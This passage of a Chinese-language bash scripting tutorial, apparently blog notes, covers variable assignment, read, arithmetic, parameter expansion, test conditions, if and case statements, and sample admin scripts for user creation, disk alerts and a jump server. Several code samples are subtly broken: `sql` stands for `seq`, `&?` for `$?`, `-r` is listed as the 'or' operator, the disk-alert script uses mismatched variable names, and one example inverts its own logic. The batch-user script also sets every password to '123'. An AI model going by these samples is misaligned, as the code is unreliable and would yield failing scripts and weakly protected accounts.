先把这个命令执行一遍再赋值: 反引号 ` `,   $()</span></span><br><span class="line">today = `date + %F`</span><br></pre></td></tr></table></figure><p>2.read读取赋值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">## -p提示信息。-t等待时间。-n只要前面几个字符</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># read -p "提示信息： "  变量名</span></span><br><span class="line"><span class="comment"># read -t 5 -p "提示信息： "  变量名</span></span><br><span class="line"><span class="comment"># read -n 2  变量名</span></span><br><span class="line"><span class="comment"># read 可以同时跟多个变量。空格隔开，直接一次性赋值</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"输入姓名，年龄，性别[e.g zhangsan 20 m]： "</span> name age gender</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"your name: <span class="variable">$name</span>, your age <span class="variable">$age</span>, your gender <span class="variable">$gender</span>"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 注意事项：</span></span><br><span class="line"><span class="string">""</span>   <span class="comment"># 弱引用(里面可以放变量$ip)</span></span><br><span class="line"><span class="string">''</span>   <span class="comment"># 强引用（里面不能引用变量,会原样输出）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 命令替换：  `` 等价于 $(), 里面的命令会先执行</span></span><br></pre></td></tr></table></figure><h5 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h5><blockquote><p>变量赋值，等号两边不能有空格</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c1 <span class="variable">$ip</span> &amp;&gt;/dev/null &amp;&amp; <span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is up"</span> || <span class="built_in">echo</span> <span class="string">"<span class="variable">$ip</span> is down"</span></span><br></pre></td></tr></table></figure><h5 id="变量引用"><a href="#变量引用" class="headerlink" title="变量引用"></a>变量引用</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 引用</span></span><br><span class="line">1. $变量</span><br><span class="line">2. <span class="variable">$&#123;变量&#125;</span>   <span class="comment"># 大括号简单理解为：防止歧义</span></span><br></pre></td></tr></table></figure><h5 id="变量的运算"><a href="#变量的运算" class="headerlink" title="变量的运算"></a>变量的运算</h5><blockquote><p>使用场景：内存使用, ping次数等 … … </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 1.整数运算    90%以上</span></span><br><span class="line"><span class="comment"># 方法1：  expr        +   -    \*   /   %</span></span><br><span class="line">expr 1+2</span><br><span class="line">expr <span class="variable">$num1</span> + <span class="variable">$num2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2：  $(())       +   -   *   /     %          </span></span><br><span class="line"><span class="built_in">echo</span> $((<span class="variable">$num1</span>+<span class="variable">$num2</span>))</span><br><span class="line"><span class="built_in">echo</span> $((num1+num2))</span><br><span class="line"><span class="built_in">echo</span> $((5-3*2))</span><br><span class="line"><span class="built_in">echo</span> $(((5-3)*2))</span><br><span class="line"><span class="built_in">echo</span> $(((2**3))</span><br><span class="line"><span class="built_in">echo</span> $(((1+2));<span class="built_in">echo</span> <span class="variable">$sum</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法3：  $[]         +  -  *  /  %</span></span><br><span class="line"><span class="built_in">echo</span> $[5+2]                  </span><br><span class="line"><span class="built_in">echo</span> $[5**2]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法4：  let       使用最多</span></span><br><span class="line"><span class="built_in">let</span> sum=2+3;<span class="built_in">echo</span> <span class="variable">$sum</span></span><br><span class="line"><span class="built_in">let</span> i++;<span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 2.小数运算</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"2*4"</span>|bc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"2^4"</span>|bc</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"scale=2;6/4"</span>|bc</span><br><span class="line">awk <span class="string">'BEGIN&#123;print 1/2&#125;'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"print 5.0/2"</span>|python</span><br></pre></td></tr></table></figure><h5 id="变量的删除-替换"><a href="#变量的删除-替换" class="headerlink" title="变量的删除/替换"></a>变量的删除/替换</h5><blockquote><p>使用场景：让你输入值但是你没输入，我就给你一个默认值</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### 删除</span></span><br><span class="line">url=<span class="string">"www.baidu.com"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#url&#125;</span>   <span class="comment"># 从前往后，井号，输出长度， 最短匹配</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url#www.&#125;</span>   <span class="comment">#  把前面部分删除</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url#*baidu.&#125;</span>    <span class="comment">#  把前面部分删除   * </span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url##*.&#125;</span>       <span class="comment"># 从前往后，贪婪匹配，最长匹配</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url%.&#125;</span>         <span class="comment"># 从后往前, 最短匹配</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url%%.&#125;</span>        <span class="comment"># 从后往前，贪婪匹配</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 切片</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url：0:5&#125;</span>   <span class="comment"># </span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url：5:5&#125;</span>   <span class="comment"># 从5开始，拿5个</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url：5:&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 变量内容的替换</span></span><br><span class="line">url=<span class="string">"www.baidu.com"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url/baidu/sina&#125;</span>   <span class="comment"># 百度换成新浪</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url/n/N&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;url//n/N&#125;</span>  <span class="comment"># 贪婪匹配</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## $&#123;变量名-新变量值&#125;</span></span><br><span class="line"><span class="comment"># 替代(没赋值；如果变量之前有值即便是空值就不能替代)   </span></span><br><span class="line"><span class="built_in">unset</span> var1</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;var1-aaa&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## $&#123;变量名:-新变量值&#125;</span></span><br><span class="line"><span class="comment"># 没赋值或者为空，就可以替代；如果变量之前有值就不能替代</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 拓展：</span></span><br><span class="line"><span class="variable">$&#123;变量名+新变量值&#125;</span></span><br><span class="line"><span class="variable">$&#123;变量名:+新变量值&#125;</span></span><br><span class="line"><span class="variable">$&#123;变量名=新变量值&#125;</span></span><br><span class="line"><span class="variable">$&#123;变量名:=新变量值&#125;</span></span><br><span class="line"><span class="variable">$&#123;变量名?新变量值&#125;</span></span><br><span class="line"><span class="variable">$&#123;变量名:?新变量值&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#### 自增自减</span></span><br><span class="line"><span class="comment"># i++</span></span><br><span class="line"><span class="comment"># ++i</span></span><br><span class="line"><span class="comment">## 对变量值的影响： 没啥区别</span></span><br><span class="line"><span class="comment">## 对表达式值的影响： ++i 先自增再赋值，  i++ 先赋值在自增</span></span><br></pre></td></tr></table></figure><h4 id="三-条件判断"><a href="#三-条件判断" class="headerlink" title="三.条件判断"></a>三.条件判断</h4><h5 id="if"><a href="#if" class="headerlink" title="if"></a>if</h5><blockquote><p>shell中最核心的</p></blockquote><p><strong>1.文件测试 [操作符 + 文件或目录]</strong>   </p><p>命令格式1：<code>test</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 比如判断文件是否存在，如果存在就备份(概念版)</span></span><br><span class="line">back_dir=/var/mysql_bak</span><br><span class="line"><span class="keyword">if</span> ! <span class="built_in">test</span> -d <span class="variable">$back_dir</span>;<span class="keyword">then</span>     <span class="comment"># 条件测试语句test， 如果不是目录或者这个目录不存在</span></span><br><span class="line">mkdir -p <span class="variable">$back_dir</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"开始备份..."</span></span><br><span class="line"><span class="comment"># 执行 bash -vx test.sh        -vx可以看详细执行过程</span></span><br></pre></td></tr></table></figure><p>命令格式2： <code>[ -d /home ]</code>    方括号取代了test(注意有空格)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># man test， 帮助文档相同。 前半边是命令[,  后半边]只是一个符号</span></span><br><span class="line">back_dir=/var/mysql_bak</span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="variable">$back_dir</span> ];<span class="keyword">then</span>     <span class="comment"># 如果不是目录或者这个目录不存在</span></span><br><span class="line">mkdir -p <span class="variable">$back_dir</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"开始备份..."</span></span><br></pre></td></tr></table></figure><p>命令格式3：  <code>[[ -d /home ]]</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [ -e dir|file ]</span></span><br><span class="line">-d 是否是目录</span><br><span class="line">-f 是否为文件</span><br><span class="line">-r `当前用户`是否对该文件有读权限</span><br><span class="line">-w</span><br><span class="line">-l  是否是链接</span><br><span class="line">-b  是否为设备文件</span><br><span class="line">-c  是否为字符设备</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[ ! -d /cc ] &amp;&amp; mkdir /cc   <span class="comment"># 当前不是一个目录或者目录如果不存在，就创建</span></span><br><span class="line">[ -d /ccc ] || mkdir /ccc   <span class="comment"># 当前是一个目录或者目录如果存在，就不创建</span></span><br></pre></td></tr></table></figure><p><strong>2.数值比较</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [ 1 -gt 10 ]  大于</span></span><br><span class="line">-lt  小于</span><br><span class="line">-eq  等于</span><br><span class="line">-ne  不等于</span><br><span class="line">-ge  &gt;=</span><br><span class="line">-le  &lt;=</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装软件，先判断是否为root用户</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$UID</span> -ne 0 ];<span class="keyword">then</span>         <span class="comment"># $UID不等于0，代表不是root用户(数值比较)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"你没有权限!"</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">apt install apache2</span><br></pre></td></tr></table></figure><p>例子：用户输入(read)用户名，创建这个用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> -p <span class="string">"input the user name:  "</span> user</span><br><span class="line">id <span class="variable">$user</span> &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span>     <span class="comment"># 如果用户存在</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"user <span class="variable">$user</span> already exists"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">useradd <span class="variable">$user</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$user</span> is created."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>例子2： 如果磁盘是使用量超过90%， 就报警</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># grep'/$' 是提取根分区， $(NF) 是倒数第一列， awk是以什么分割</span></span><br><span class="line"></span><br><span class="line">dick_use=`df -Th |grep<span class="string">'/$'</span>|awk <span class="string">'&#123;print $(NF-1)&#125;'</span>|awk -F<span class="string">"%"</span> <span class="string">'&#123;print $1&#125;'</span>`</span><br><span class="line">mail_user=alice</span><br><span class="line">warn_file=/tmp/disk_warn.txt</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$dick_use</span> -gt 90 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"`date +%F:%H` disk: <span class="variable">$&#123;dick_use&#125;</span>%"</span> &gt;warn_file</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="variable">$disk_warn</span> ];<span class="keyword">then</span>      <span class="comment"># 将报错文件发送给邮件用户</span></span><br><span class="line">mail -s <span class="string">"disk  warning..."</span> <span class="variable">$mail_user</span> &lt; <span class="variable">$dick_use</span>     <span class="comment"># |mail -s 邮件主题</span></span><br><span class="line">rm -rf <span class="variable">$disk_warn</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以用crontab，定时执行（crontab -e会把所有的任务清除）</span></span><br><span class="line"><span class="comment"># 换行是 \</span></span><br></pre></td></tr></table></figure><p><strong>3.字符串比较</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">=</span><br><span class="line">==</span><br><span class="line">!=</span><br><span class="line">[ -n <span class="string">"hhh"</span> ]  <span class="comment"># 长度不是0</span></span><br><span class="line">[ -z <span class="string">"<span class="variable">$user</span>"</span> ]  <span class="comment"># 长度为0  (变量为空/未定义 =&gt; 都是0)</span></span><br><span class="line">-a     <span class="comment"># 并且    [1 -lt 1 -a 5 -gt 10]</span></span><br><span class="line">-r     <span class="comment"># 或者</span></span><br><span class="line">&amp;&amp;</span><br><span class="line">||</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="variable">$USER</span> != <span class="string">'root'</span> ];<span class="keyword">then</span>         <span class="comment"># $USER不等于root(字符串比较)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"你没有权限!"</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">apt install apache2</span><br></pre></td></tr></table></figure><p>例子：批量创建用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#尽量使用双引号引起来</span></span><br><span class="line"><span class="comment">#[ "$USER" = "root" ]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">##################################</span></span><br><span class="line"><span class="comment">#脚本规范 #</span></span><br><span class="line"><span class="comment">#useradd     #</span></span><br><span class="line"><span class="comment">#V1.0 by xps 01/03/2020     #</span></span><br><span class="line"><span class="comment">##################################</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"Please input number: "</span> num</span><br><span class="line"><span class="comment"># read -p "Please input 前缀: " prefix</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="comment"># 对用户输入进行过滤（数字） ^[0-9]+$  正则 =~ (模式串不能带双引号)</span></span><br><span class="line"><span class="comment">#if [[ ! "$num" =~ ^[0-9]+$ || "$num" =~ ^0+$ ]];then   # []单个方括号不支持正则，用[[ 变量 =~ 模式 ]]</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">"<span class="variable">$num</span>"</span> =~ ^[0-9]+$ ]];<span class="keyword">then</span>  </span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"不是数字，Please input number again: "</span> num</span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"Please input 前缀: "</span> prefix</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$prefix</span>"</span> ];<span class="keyword">then</span>   <span class="comment"># 如果长度为非0</span></span><br><span class="line"><span class="built_in">break</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"Please input 前缀: "</span> prefix</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># man seq   打印序列： seq 1 2 10 (区间，步长)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `sql <span class="variable">$num</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">user=<span class="variable">$prefix</span><span class="variable">$i</span></span><br><span class="line">useradd <span class="variable">$user</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"123"</span> |passwd --stdin <span class="variable">$user</span>   <span class="comment"># --stdin 前面输出的当做标准输入</span></span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$user</span> is created."</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># declare 可以定义数据类型。但是一般不用，因为都是字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 语法不难，主要是对Linux系统以及命令的熟悉。</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># if后门紧跟的不一定是方括号，只要是能返回true/false的就行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ condition ]]; <span class="keyword">then</span></span><br><span class="line"><span class="comment">#statements</span></span><br><span class="line"><span class="keyword">elif</span> [[ condition ]]; <span class="keyword">then</span></span><br><span class="line"><span class="comment">#statements</span></span><br><span class="line"><span class="keyword">elif</span> [[ condition ]]; <span class="keyword">then</span></span><br><span class="line"><span class="comment">#statements</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h5 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h5><p>语法结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> 变量 <span class="keyword">in</span></span><br><span class="line">模式1)<span class="comment"># 都是字符串， 可以用通配符 (尽量使用双引号)</span></span><br><span class="line">命令序列1</span><br><span class="line">;;</span><br><span class="line">模式2)</span><br><span class="line">命令序列2</span><br><span class="line">;;</span><br><span class="line">模式3)</span><br><span class="line">命令序列3</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">无匹配后命令序列</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><p>例子1：删除用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> -p <span class="string">"请输入要删除的用户名： "</span> user</span><br><span class="line">id <span class="variable">$user</span> &amp;&gt;/dev/null</span><br><span class="line"><span class="keyword">if</span> [ &amp;? -ne 0 ];<span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"no suc user: <span class="variable">$user</span>"</span></span><br><span class="line"><span class="built_in">exit</span> 1<span class="comment"># 返回1（意思是错误退出）</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"你确定要删除用户: <span class="variable">$user</span> 吗 ?[y/n]: "</span> action</span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$action</span>"</span> <span class="keyword">in</span></span><br><span class="line">y|Y|yes|YES)</span><br><span class="line">userdel -r <span class="variable">$user</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"deleted user: <span class="variable">$user</span> success!"</span></span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"error"</span></span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><p>例子2： 判断一个东西是不是命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># command -v xxx</span></span><br><span class="line"><span class="comment"># echo $? 返回为0就是</span></span><br><span class="line"><span class="built_in">command</span> -v ls</span><br><span class="line"></span><br><span class="line">cmd1=/bin/date</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">command</span> -v <span class="variable">$cmd1</span> &amp;&gt;/dev/null;<span class="keyword">then</span></span><br><span class="line"><span class="comment"># 神马都不做： 只加一个冒号</span></span><br><span class="line">:</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$cmd1</span> 是一个命令"</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>例子3：通过登录堡垒机/跳板机 jumpserver ，然后登录内网的服务器 （简易版）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 1.先登录到跳板机(普通账号)</span></span><br><span class="line"><span class="comment"># 2.跳板机登录到other server（）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录两次，有点麻烦</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 例子： 先登录到跳板机，再通过选项选择要登录到哪台服务器（1.密码认证 2.秘钥认证:以用户xps身份做 ssh-keygen, ssh-copy-id web1）</span></span><br><span class="line"><span class="comment"># 以xps身份登录上来， 秘钥登录服务器</span></span><br><span class="line"><span class="comment"># 脚本放到/home/xps/jumpserver.sh, 放到bashrc，登录这台机器就执行，并且禁止用户(^C)退出</span></span><br><span class="line"></span><br><span class="line"></span><br><span 